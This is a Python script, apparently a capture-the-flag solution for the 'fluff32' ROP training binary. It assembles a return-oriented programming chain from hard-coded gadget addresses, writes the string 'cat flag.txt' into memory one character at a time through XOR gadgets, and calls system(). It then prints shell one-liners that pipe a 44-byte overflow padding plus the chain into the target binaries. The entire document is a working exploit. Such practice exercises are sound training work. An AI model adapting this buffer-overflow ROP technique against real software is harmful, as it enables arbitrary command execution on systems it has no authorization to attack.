import binascii
import random


def addr_conv(input):
    data = ""
    new_inp = hex(input)[2:].rjust(8, "0")
    for i in range(0, len(new_inp), 2):
        data = "\\x" + new_inp[i] + new_inp[i+1] + data
    return data

def convertor(input):
    data = ""
    for c in input:
        data += "\\x" + binascii.hexlify(c.encode()).decode()
    while len(data) < 16:
        data += "\\x00"
    return data

def addr_xor(addr, xord=0xdefaced0):
    return addr_conv(xord^addr)


data = 0x0804A028
system_call = 0x08048430

gadg_xor = 0x08048696
gadg_xch = 0x08048689
gadg_xor_db = 0x0804867B
gadg_pop_b = 0x080483e1
gadg_mov_d = 0x0804868c
gadg_inc_c = 0x080488ba
bla = 0x54545454
ret_addr = 0x080485d9
#exit_addr = 0x080484F0
string = "cat flag.txt"
payload = ""
i = 0
while i < len(string):
    payload += addr_conv(gadg_pop_b) + addr_xor(data+i) + addr_conv(gadg_mov_d) + addr_conv(gadg_xor_db) \
               + addr_conv(bla) + addr_conv(gadg_xch) + addr_conv(bla)
    for j in range(len(string[i:i+4])):
        payload += addr_conv(gadg_xor) + convertor(string[i+j]) + addr_conv(gadg_inc_c)
    i += 4
payload += addr_conv(system_call) + addr_conv(ret_addr) + addr_conv(data)
print("python -c 'print \"A\"*44+\""+payload+"\"' | ./fluff32")
print("python -c 'print \"A\"*44+\""+payload+"\"' | ./linux_server")
